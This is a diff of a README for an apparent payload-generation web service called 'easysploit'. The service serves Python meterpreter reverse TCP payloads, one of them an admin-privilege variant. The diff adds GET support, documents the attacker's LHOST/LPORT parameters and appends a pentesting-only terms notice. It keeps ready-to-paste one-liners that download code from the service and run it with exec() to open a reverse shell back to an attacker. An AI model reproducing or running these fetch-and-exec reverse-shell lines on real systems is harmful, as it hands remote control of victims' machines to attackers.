@@ -25,7 +25,7 @@ It is already working on https://easysploit.rocknroll17.com.
 
 ## Usage
 ### Available Endpoints
-**POST**
+**GET & POST**
 1. **Standard python Reverse TCP Payload**
 Endpoint: `/python/meterpreter/reverse_tcp`
 2. **Admin Privilege Reverse TCP Payload**
@@ -33,14 +33,20 @@ Endpoint: `/python/meterpreter/reverse_tcp/admin`
   
 You can try these request in https://easysploit.rocknroll17.com/docs
 
-### Request Body
-Both endpoints require the same JSON payload:
+### GET Param
+```
+LHOST: Attacker's IP
+LPORT: Attacker's listening port
+```
+  
+### POST Body
+Both endpoints require the same JSON payload:  
 ```
 {
   "LHOST": "Attacker's IP",
   "LPORT": Attacker's listening port
 }
-```
+```  
 
 ## Example Code
 Insert this code where you gonna exploit.
@@ -54,3 +60,8 @@ exec(urllib.request.urlopen(urllib.request.Request("https://easysploit.rocknroll
 import urllib.request, json
 exec(urllib.request.urlopen(urllib.request.Request("https://easysploit.rocknroll17.com/python/meterpreter/reverse_tcp/admin", data=json.dumps({"LHOST": "Attacker's IP", "LPORT": Attacker's listening port}).encode(), headers={'Content-Type': 'application/json'})).read().decode())
 ```
+
+## Terms of Use
+This tool is provided for **legal pentesting tests** and should only be used in **authorized environments**.  
+Any illegal activity performed using this tool is the **sole responsibility of the user**.  
+By using this tool, you agree to these terms and accept full legal responsibility for its use.
